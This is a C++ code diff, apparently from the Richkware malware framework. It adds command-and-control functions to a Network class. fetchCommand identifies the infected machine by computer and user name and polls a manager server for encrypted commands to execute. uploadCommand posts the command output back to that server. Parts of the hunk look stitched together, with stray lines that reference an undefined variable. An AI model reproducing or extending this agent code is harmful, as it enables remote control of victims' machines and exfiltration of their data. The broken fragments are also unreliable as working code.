@@ -43,7 +43,7 @@ Network &Network::operator=(const Network &network) {
     server = Server(encryptionKeyArg);
 }*/
 
-Network::Network(const std::string &serverAddressArg, const std::string& portArg,
+Network::Network(const std::string &serverAddressArg, const std::string &portArg,
                  const std::string &associatedUserArg,
                  const std::string &encryptionKeyArg) {
     serverAddress = serverAddressArg;
@@ -177,6 +177,137 @@ Network::UploadInfoToRMS(const std::string &serverAddress, const std::string &po
                          "Connection: close\r\n" +
                          "\r\n";
 
+    std::string response = RawRequest(serverAddress, port, packet.c_str());
+    if (response.find("Error") != std::string::npos) {
+        return false;
+    }
+    return true;
+}
+
+std::string Network::fetchCommand() {
+
+    Crypto crypto(encryptionKey);
+    std::string device = getenv("COMPUTERNAME");
+    device.append("/");
+    device.append(getenv("USERNAME"));
+
+    std::string srvAddr(serverAddress);
+    std::string prt(port);
+
+    http::Request request(
+            "http://" + srvAddr + ":" + prt + "/Richkware-Manager-Server/command?data0=" + device + "&data1=agent");
+
+//    std::string parameters = "{data0:\"" + device + "\",data1:\"agent\"}";
+//    std::cout << parameters << std::endl;
+    http::Response response = request.send("GET");
+    std::string jsonResponse(response.body.begin(), response.body.end());
+    if (jsonResponse.find("OK") != std::string::npos) {
+        std::string delimiter = "\"message\":\"";
+        std::string delimiter2 = "\"";
+
+        size_t pos = 0;
+        pos = jsonResponse.find(delimiter);
+        jsonResponse.erase(0, pos + delimiter.length());
+
+        std::string token2;
+        pos = jsonResponse.find(delimiter2);
+        return jsonResponse.substr(0, pos);
+    }
+    return "";
+
+//    Crypto crypto(encryptionKey);
+//    std::string device = getenv("COMPUTERNAME");
+//    device.append("/");
+//    device.append(getenv("USERNAME"));
+//
+//    std::string packet = "GET /Richkware-Manager-Server/command?data0=" + device +
+//                         "&data1=agent" +
+//                         " HTTP/1.1\r\n" +
+//                         "Host: " + serverAddress + "\r\n" +
+//                         "Connection: close\r\n" +
+//                         "\r\n";
+//
+//    std::string response = RawRequest(serverAddress, port,
+//                                      packet.c_str()); //response è un JSON che contiene i comandi criptati da eseguire
+    /*
+     * JSON format returned by server:
+     * {
+     *     status: "OK",
+     *     statusCode: 1000,
+     *     message: {
+     *         commands: "[encrypted string]"
+     *     }
+     * }
+     *
+     * "encrypted string" is formatted as follows:
+     * "command1##command2##commandN"
+     * */
+    //parse message from server
+//    if (response.find("OK") != std::string::npos) {
+//        std::string delimiter = "\"message\":\"";
+//        std::string delimiter2 = "\"";
+//
+//        size_t pos = 0;
+//        std::string token;
+//        pos = response.find(delimiter);
+//        response.erase(0, pos + delimiter.length());
+//
+//        std::string token2;
+//        pos = response.find(delimiter2);
+//        token = response.substr(0, pos);
+//        return token;        //returns an encrypted string containing the commands to be executed
+//    } else {
+//        //TODO: manage KO from server
+//        return "";
+//    }
+}
+
+bool Network::uploadCommand(std::string commandsOutput) {
+
+    Crypto crypto(encryptionKey);
+    std::string device = getenv("COMPUTERNAME");
+    device.append("/");
+    device.append(getenv("USERNAME"));
+
+    std::string srvAddr(serverAddress);
+    std::string prt(port);
+
+    http::Request request("http://" + srvAddr + ":" + prt + "/Richkware-Manager-Server/command");
+
+    std::string parameters = "{device:\"" + device + "\",data:\"" + commandsOutput + "\"}";
+
+    http::Response response = request.send("POST", parameters, {
+            "Content-Type: application/json"
+    });
+
+    if (std::string(response.body.begin(), response.body.end()).find("OK") != std::string::npos) {
+        return true;
+    }
+    return false;
+
+//    std::string packet = "POST /Richkware-Manager-Server/command HTTP/1.1\r\nHost: " + srvAddr +
+//                         "\r\n" +
+//                         "Connection: close\r\n" +
+//                         "\r\n" +
+//                         "{\"device\": \"" + device + "\", \"data\": \"" + commandsOutput +"\"}";
+//    std::string packet = "POST /Richkware-Manager-Server/command HTTP/1.1\r\n"
+//                         "\r\n"
+//                         "Content-Type: application/json; charset=utf-8\r\n"
+//                         "Host: " + srvAddr + ":" + prt + "\r\n"
+//                         "Connection: Close\r\n"
+//                         "\r\n"
+//                         "{\"device\":\"" + device + "\",\"data\":\"" + commandsOutput + "\"}";
+//
+//    std::string response = RawRequest(serverAddress, port,
+//                                      packet.c_str()); //response è un JSON che contiene i comandi criptati da eseguire
+//    std::cout << response << std::endl;
+//    //parse message from server
+//    if (response.find("OK") != std::string::npos) {
+//        return true;
+//    } else {
+//        //TODO: manage KO from server
+//        return false;
+//    }
     std::string response = RawRequest(serverAddress, port, packet);
     //std::cout<<response<<std::endl;
     if (response.find("Error") != std::string::npos){
@@ -352,7 +483,7 @@ DWORD WINAPI ServerThread(void *arg) {
             //hClientThreadArray[i] =
             HANDLE hThreadC = CreateThread(0, 0, &ClientSocketThread, (void *) /*&*/csa, 0, NULL);
             // detach
-            CloseHandle(hThreadC);
+//            CloseHandle(hThreadC);
         }
     }
     return 0;
